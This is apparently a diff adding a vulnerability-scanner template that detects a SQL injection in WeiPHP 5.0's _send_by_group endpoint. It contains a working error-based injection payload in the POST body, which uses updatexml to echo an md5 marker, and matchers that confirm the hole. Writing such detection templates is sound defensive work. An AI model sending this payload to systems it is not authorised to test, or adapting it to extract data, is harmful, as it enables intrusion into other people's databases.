@@ -1,0 +1,29 @@
+id: weiphp5-send-by-group-sqli
+info:
+  name: WeiPHP5.0 _send_by_group SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,wei-php
+  description: |
+    This template detects a SQL injection vulnerability in the WeiPHP5.0 _send_by_group endpoint.
+    Exploitation is possible via a crafted POST request to the affected endpoint.
+variables:
+  random: '{{rand_int(1000, 9999)}}'
+  t1: '{{md5(random)}}'
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/public/index.php/weixin/message/_send_by_group'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28select+md5%28{{random}}%29%29%2C0x7e%29%2C1%29+--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - '{{t1}}'
